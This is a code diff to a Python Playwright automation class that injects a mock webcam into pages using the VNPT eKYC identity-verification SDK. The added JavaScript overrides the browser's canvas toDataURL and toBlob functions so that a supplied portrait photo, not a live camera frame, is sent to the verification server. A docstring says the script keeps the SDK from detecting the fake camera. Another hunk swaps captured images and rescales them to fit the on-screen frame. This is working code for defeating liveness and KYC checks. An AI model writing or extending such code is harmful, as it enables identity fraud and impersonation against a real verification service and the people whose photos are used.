@@ -44,6 +44,7 @@ class PlaywrightRunner:
 		log: Callable[[str], None] | None = None,
 	) -> tuple[str, str]:
 		base64_img = get_face_frame_base64(portrait_path)
+		portrait_b64 = get_id_photo_base64(portrait_path)
 		self._portrait_path = portrait_path  # Lưu lại để dùng ở trang xác nhận
 		try:
 			self._page.close()
@@ -53,9 +54,9 @@ class PlaywrightRunner:
 		self._attach_page_listeners(log)
 		self._maximize_window(log)
 		self._sync_viewport_to_screen(log)
-		if base64_img:
+		if base64_img and portrait_b64:
 			# Inject mock camera script that streams the base64 image at 30 fps
-			self._page.add_init_script(self._build_mock_camera_script(base64_img))
+			self._page.add_init_script(self._build_mock_camera_script(base64_img, portrait_b64))
 			if log:
 				log("Đã khởi tạo Camera ảo giả lập ảnh chân dung")
 		else:
@@ -247,7 +248,7 @@ class PlaywrightRunner:
 	# ------------------------------------------------------------------ #
 	#  Mock camera JS – full hardware simulation                           #
 	# ------------------------------------------------------------------ #
-	def _build_mock_camera_script(self, base64_img: str) -> str:
+	def _build_mock_camera_script(self, base64_img: str, portrait_b64: str) -> str:
 		"""Return JS that simulates a full physical webcam device.
 
 		This script prevents the VNPT eKYC SDK from detecting a fake
@@ -267,6 +268,30 @@ class PlaywrightRunner:
 		  /* ---------- save originals ---------- */
 		  const _origGetUserMedia = navigator.mediaDevices.getUserMedia.bind(navigator.mediaDevices);
 		  const _origEnumerate    = navigator.mediaDevices.enumerateDevices.bind(navigator.mediaDevices);
+		  const _origToDataURL    = HTMLCanvasElement.prototype.toDataURL;
+		  const _origToBlob       = HTMLCanvasElement.prototype.toBlob;
+		  
+		  /* ---------- override toDataURL & toBlob to inject HD crop to Server ---------- */
+		  HTMLCanvasElement.prototype.toDataURL = function(type, encoderOptions) {{
+		      const video = document.querySelector('video');
+		      if (video && video.readyState >= 2 && document.querySelector('.box-camera')) {{
+		          console.log("[FakeCam] HACKED toDataURL! Injecting HD Portrait to Server!");
+		          return "{portrait_b64}";
+		      }}
+		      return _origToDataURL.apply(this, arguments);
+		  }};
+		  
+		  HTMLCanvasElement.prototype.toBlob = function(callback, type, quality) {{
+		      const video = document.querySelector('video');
+		      if (video && video.readyState >= 2 && document.querySelector('.box-camera')) {{
+		          console.log("[FakeCam] HACKED toBlob! Injecting HD Portrait to Server!");
+		          fetch("{portrait_b64}")
+		              .then(res => res.blob())
+		              .then(blob => callback(blob));
+		          return;
+		      }}
+		      return _origToBlob.apply(this, arguments);
+		  }};
 
 		  /* ---------- constants ---------- */
 		  const W  = 1280;
@@ -432,8 +457,12 @@ class PlaywrightRunner:
 								imgs.forEach(img => {{
 									// 1. Phân biệt ảnh chụp và viền xanh dựa vào DUNG LƯỢNG (độ dài chuỗi base64).
 									// 2. Ảnh chụp webcam thường rất lớn (> 50,000 ký tự). Viền xanh thì nhẹ hơn nhiều.
-									if (img.src && img.src.length > 50000 && img.src !== myPayload) {{
-										img.src = myPayload;
+									if (img.src && img.src.length > 50000) {{
+										if (img.src !== myPayload) {{
+											img.src = myPayload;
+										}}
+										// Thu nhỏ ảnh xuống 85% để tạo khoảng trống, nằm lọt thỏm giữa 4 góc viền xanh
+										img.style.setProperty('transform', 'scale(0.85)', 'important');
 									}}
 								}});
 								
